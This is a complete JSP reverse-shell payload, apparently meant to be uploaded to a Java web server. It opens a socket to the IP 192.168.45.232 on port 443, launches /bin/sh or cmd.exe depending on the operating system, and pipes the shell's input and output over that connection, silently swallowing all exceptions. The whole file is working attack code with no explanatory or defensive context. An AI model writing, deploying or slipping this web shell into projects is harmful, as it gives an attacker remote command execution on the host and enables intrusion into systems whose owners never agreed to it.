<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream gO;
    OutputStream hq;

    StreamConnector( InputStream gO, OutputStream hq )
    {
      this.gO = gO;
      this.hq = hq;
    }

    public void run()
    {
      BufferedReader yS  = null;
      BufferedWriter ip3 = null;
      try
      {
        yS  = new BufferedReader( new InputStreamReader( this.gO ) );
        ip3 = new BufferedWriter( new OutputStreamWriter( this.hq ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = yS.read( buffer, 0, buffer.length ) ) > 0 )
        {
          ip3.write( buffer, 0, length );
          ip3.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( yS != null )
          yS.close();
        if( ip3 != null )
          ip3.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.45.232", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
